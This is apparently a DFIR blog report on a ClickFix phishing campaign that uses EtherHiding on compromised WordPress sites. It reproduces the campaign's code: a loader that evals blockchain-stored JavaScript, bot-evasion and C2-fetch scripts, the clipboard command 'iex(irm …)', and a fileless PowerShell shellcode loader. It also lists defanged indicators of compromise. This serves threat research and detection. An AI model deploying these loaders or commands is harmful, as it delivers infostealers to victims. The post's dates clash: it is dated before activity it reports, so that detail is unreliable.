
---
title: "EtherHiding Attack Chain"
date: 2026-05-17
draft: false
image: brand_image.jpg
tags: ["AnyRun", "ClickFix",  "Phishing","EtherHiding"]
series: "DFIR"
---

- Reading time : "13 min"

# ClickFix Phishing Campaign with EtherHiding


## Executive Summary

This report documents an active, sophisticated multi-stage attack campaign observed across hundreds of compromised WordPress websites. The campaign fuses two advanced techniques: **ClickFix** social engineering — which tricks users into manually executing malicious commands — and **EtherHiding**, a persistence mechanism that stores malware payloads directly on the Binance Smart Chain (BSC), making takedown nearly impossible.

Researchers identified over **400 sandbox analyses on ANY.RUN** linked to this campaign's infrastructure, with C2 domains `dntds.shop` and `sdntds.shop` observed in active use as recently as **June 13, 2026**. The final payload is a PowerShell-based shellcode loader that downloads and executes a binary from a bulletproof-hosted IP (`158[.]94[.]208[.]92` / `158[.]94[.]208[.]104`), consistent with infostealer or RAT deployment.

**Why it matters.** EtherHiding represents a shift in how web-based attacks deliver malware. By moving payload delivery into smart contracts on the BSC testnet, attackers can rotate payloads without ever touching the compromised sites. The injected JavaScript hides behind a counterfeit CAPTCHA page and uses the Ethers library to fetch OS-specific stages directly from on-chain storage — a delivery model built on decentralized infrastructure, lightweight updates, and inexpensive gas-funded transactions.

The fake CAPTCHA is the lure for the ClickFix step: victims are told to "prove they are human" by copying attacker-controlled code and running it locally via Terminal or the Windows Run dialog. This user-driven execution path bypasses many traditional detections that rely on exploit behavior or browser sandbox signals. The payloads delivered through these chains remain fluid but commonly include families such as **Amos Stealer** and **Vidar**.

Together, decentralized staging, social engineering, and user-supplied execution mark a growing trend in attacker workflows. The architecture removes many predictable infrastructure pivot points and increases operational agility. Defenders should recognize that **on-chain staging is becoming a practical alternative to the disposable infrastructure** traditionally seen in web-based threats.



Threat intelligence research conducted on the ANY.RUN interactive sandbox reveals that this campaign extends well beyond the samples analyzed in this report. With over 400 independent sandbox submissions recorded, multiple detonations from unrelated sources consistently share the same infrastructure, payloads, and behavioral patterns — confirming this is a large-scale, coordinated campaign rather than an isolated incident.

![ANY.RUN interactive sandbox ](/images/etherTI.png"ANY.RUN interactive sandbox")



## Full Attack Chain Analysis


The campaign operates across five distinct stages. Each stage is independently analysed below with payload evidence.


### Stage 0 — WordPress Mass Compromise

The attack begins with the bulk compromise of WordPress websites. The threat actor likely uses one or more of the following vectors: credential stuffing against ***wp-login.php*** using leaked credential databases; exploitation of known vulnerabilities in popular plugins (WooCommerce, Elementor, WPForms); or purchase of access from initial access brokers who sell pre-compromised WordPress shells.
Once inside, the attacker injects a compact JavaScript loader stub into a persistent location — typically the active theme's functions.php, the wp_options database table (via a rogue widget or siteurl injection), or a backdoored plugin. The injected stub is small enough to blend into legitimate minified code and survives most plugin-only security scans

```json

fetch('hxxps://bsc-testnet-rpc[.]publicnode[.]com', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    jsonrpc: '2.0', method: 'eth_call',
    params: [{ to: '0x<CONTRACT>', data: '0x<SELECTOR>' }, 'latest'],
    id: 485292
  })
})
.then(r => r.json())
.then(payload => eval(atob(decodeABI(payload.result))));

```

### Stage 1 — EtherHiding: Blockchain Payload Fetch

When a human visitor loads a compromised WordPress page, the injected stub fires a Fetch/XHR POST request to bsc-testnet-rpc.publicnode.com. This call is observable in sandbox tools as an outbound network request. The request body is a standard JSON-RPC eth_call to a BSC smart contract.
The BSC node responds with a JSON-RPC result containing the ABI-encoded payload:



```json
// Observed RPC response (truncated)
{
  "jsonrpc": "2.0",
  "id": 485292,
  "result": "0x000000...0000002000000000000000000000000007dc
             4f79466d6457356a64476c76626967...<base64 payload>..."
}

```

![The injected code on the WordPress site ](/images/testBSC.png "The injected code on the WordPress site")


The result field is ABI-encoded as a Solidity string type. The loader skips the 64-byte ABI prefix (offset + length fields), then base64-decodes the remaining 2,012 bytes to recover the Stage 2 JavaScript.

Tool to decode it [CyberChef](https://gchq.github.io/CyberChef/).


### Stage 2 — Evasion + Bot Filtering

The decoded Stage 2 payload is a self-invoking JavaScript function. Its primary purpose is to determine whether the current visitor is a real human or an automated scanner. The function checks three independent signals:

    •	User-Agent string: checked against 14 known bot/crawler/security tool signatures
    •	document.referrer: aborts if the referrer includes WordPress system paths (/wp-json, wp-sitemap, robots, .xml)
    •	window.location.href: aborts if the current URL matches WordPress admin paths, static assets, or feed endpoints


```json
// Stage 2 — Bot/scanner evasion (decoded from BSC payload)

;!function(){try{
  var t = navigator.userAgent.toLowerCase(),
      a = document.referrer.toLowerCase(),
      r = window.location.href.toLowerCase();

  // Check 1: 14 bot/tool signatures in User-Agent
  if(/bot|crawl|slurp|spider|baidu|ahrefs|mj12bot|semrush|
     facebookexternalhit|facebot|ia_archiver|yandex|
     phantomjs|curl|wget|python|java/i.test(t)

  // Check 2: Referrer from WordPress internal paths
  || -1!==a.indexOf('/wp-json') || -1!==a.indexOf('wp-sitemap')
  || -1!==a.indexOf('robots')   || -1!==a.indexOf('.xml')

  // Check 3: Current URL is WP admin, feed, or static asset
  || /wp-login\.php|wp-admin|wp-includes|\.css|\.js|
     \.png|\.gif|sitemap.*\.xml|robots\.txt/i.test(r))

  return; // ABORT — scanner detected, do nothing
  ...


```



### Stage 3 — Stage 3 Payload Fetch from C2 

If the visitor passes the evasion checks, Stage 2 decodes a list of C2 URLs from base64 and uses a synchronous XMLHttpRequest to fetch Stage 3 JavaScript. The C2 URL list implements automatic failover — if the primary server fails, execution retries with the next URL.

| Index|	Decoded C2 URL	               | Role|
| ----|------------------------------------|-------|
|n[0] |	hxxps://dntds[.]shop/teamrepo?rnd= |	Primary C2 |
|n[1] |	hxxps://sdntds[.]shop/teamrepo?rnd= |	Secondary C2 (failover) |
|n[2] |	hxxps://dntds[.]shop/teamrepo?rnd= |	Tertiary C2 (duplicate) |

The final request URL appends a random float and Unix timestamp (Math.random() and Date.now()) to the base URL — this cache-busting technique prevents HTTP caching and makes each request URL unique, defeating URL-based blocklists. The XHR is executed synchronously (!1 = false as the async parameter), blocking page execution until the C2 responds.



```json

// Stage 3 fetch — synchronous XHR to C2
var url = base64Decode(n[t]) + Math.random() + '&ts=' + Date.now();

var r = new XMLHttpRequest;
r.open('GET', url, false);  // false = SYNCHRONOUS (blocking)
r.send(null);

if (r.status >= 200 && r.status < 300) {
  var s = document.createElement('script');
  s.text = r.responseText.trim();  // raw JS from C2
  document.head.appendChild(s);   // execute immediately
} else {
  e(t + 1);  // failover to next C2 URL
}

```

### Stage 4 — ClickFix: Fake Cloudflare CAPTCHA

The JavaScript returned by dntds[.]shop is the ClickFix payload — a full-page fake Cloudflare Turnstile interface. The payload renders a convincing, pixel-perfect replica of the Cloudflare security challenge, complete with animated spinner, Cloudflare branding, privacy/terms links, and a real-looking Ray ID generated randomly at runtime.


The payload uses a Shadow DOM (attachShadow) to isolate its CSS from the page, preventing interference and making it harder to detect via DOM inspection. The fake CAPTCHA overlay is injected with z-index: 2147483647 (the maximum possible), ensuring it covers the entire page.

Key deceptive elements in the ClickFix payload:

    •	Authentic Cloudflare SVG logo and Turnstile checkbox animation
    •	Rotating spinner with Cloudflare orange colour (#F6821F)
    •	Platform-aware instructions: different steps shown for Mac vs Windows
    •	Windows users: Win+X → Terminal → Ctrl+V → Enter
    •	Mac users: Cmd+Space → Terminal → Cmd+V → Return
    •	"Check" button disabled for 30 seconds to force the user to paste the command first
    •	Persistence via cookie and localStorage — won't show twice to the same browser
    •	Fake Ray ID (16 random alphanumeric chars) to enhance authenticity

The malicious PowerShell command silently written to the victim's clipboard:



![The CAPTCHA decoded payload ](/images/etherclickFake.png "The CAPTCHA decoded payload")

Tool to decode it [WebCrack](https://webcrack.netlify.app/).


```json
# Malicious clipboard content (Windows target)
$global:cfChallenge="challenge.cloudflare.com"
$global:challengeHash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
$global:confirmChallenge=$true

iex(irm 158[.]94[.]208[.]92 -UseBasicParsing)



```



### Stage 5 — PowerShell Shellcode Loader (Final Payload)



When the victim pastes and executes the clipboard command in PowerShell, Invoke-RestMethod (irm) downloads a second-stage PowerShell script from 158.94.208.92, which is immediately executed via Invoke-Expression (iex). This second-stage script downloads a binary payload and executes it in memory using direct Win32 API calls via P/Invoke



![The Powershell payload Request ](/images/etherPowerShell.png "The Powershell payload Request")

```json

# Stage 5 — Shellcode loader (reconstructed from analysis)
$TRFLZB = "hxxp://158[.]94.]208[.]104/x7GkP2mQ9zL4/student_l.bin"

# Download binary payload
$zSVCtHT = Invoke-WebRequest -Uri $TRFLZB -UseBasicParsing
$sFRvzlkFoZBC = $zSVCtHT.Content   # raw bytes of shellcode
$EAeUbYTwpD   = $sFRvzlkFoZBC.Length

# Inline C# with Win32 API imports
Add-Type -TypeDefinition @"
  [DllImport("kernel32.dll")] VirtualAlloc(IntPtr, uint, uint, uint)
  [DllImport("kernel32.dll")] CreateThread(IntPtr, uint, IntPtr, IntPtr, uint, out uint)
  [DllImport("kernel32.dll")] WaitForSingleObject(IntPtr, uint)
"@

# Allocate RWX memory region
$mem = [KUhzHpSd]::VirtualAlloc([IntPtr]::Zero, $size,
        0x1000 -bor 0x2000,  # MEM_COMMIT | MEM_RESERVE
        0x40)               # PAGE_EXECUTE_READWRITE

# Copy shellcode bytes into allocated memory
[Marshal]::Copy($sFRvzlkFoZBC, 0, $mem, $size)

# Create new thread pointing at shellcode entry point
$tid = 0
$thread = [KUhzHpSd]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [ref]$tid)

# Wait up to 30 seconds for shellcode to complete
[KUhzHpSd]::WaitForSingleObject($thread, 30000)


```


The shellcode loader is entirely fileless — the binary is never written to disk. It uses three Win32 kernel32.dll APIs:

•	VirtualAlloc: Allocates a memory region with PAGE_EXECUTE_READWRITE (0x40) permissions — executable, readable, and writable
•	Marshal.Copy: Copies the downloaded binary bytes directly into the allocated executable memory
•	CreateThread: Creates a new Windows thread with its start address pointing to the copied shellcode
•	WaitForSingleObject: Keeps the PowerShell process alive for 30 seconds while the shellcode executes

The binary student_l.bin served from /158[.]94.]208[.]104 is the final payload. Based on the naming convention, execution method, and campaign profile, this is consistent with an infostealer (e.g., Lumma Stealer, Vidar, or Redline) or a RAT implant. The .bin extension and /x7GkP2mQ9zL4/ path component suggest a structured campaign infrastructure with multiple simultaneous payloads.


![The Binary from powershell payload on VT ](/images/etherVTBin.png "The Binary from powershell payload on VT")



## Indicators of Compromise




| Type | Indicator | Role | First Seen |
|------|-----------|------|------------|
| Domain | dntds[.]shop | Primary Stage 3 C2 | Active — June 13, 2026 |
| Domain | sdntds[.]shop | Secondary Stage 3 C2 | Active — June 13, 2026 |
| URL | hxxxp://dntds[.]shop/teamrepo | ClickFix payload endpoint | Active |
| URL | hxxxp://sdntds[.]shop/teamrepo | ClickFix payload endpoint (failover) | Active |
| URL | hxxxp://dntds[.]shop/jsrepo | ClickFix payload endpoint (rotated) | Active |
| URL | hxxxp://sdntds[.]shop/jsrepo | ClickFix payload endpoint (rotated, failover) | Active |
| RPC Endpoint | hxxxps://bsc-testnet-rpc[.]publicnode[.]com | BSC blockchain RPC (EtherHiding) | Ongoing |
| IP Address | 158[.]94[.]208[.]92 | Stage 5 PS loader delivery | Active |
| IP Address | 158[.]94[.]208[.]104 | Final shellcode (.bin) delivery | Active |
| URL | hxxxp://158[.]94[.]208[.]104/x7GkP2mQ9zL4/student_l[.]bin | Shellcode binary (student_l.bin) | Active |
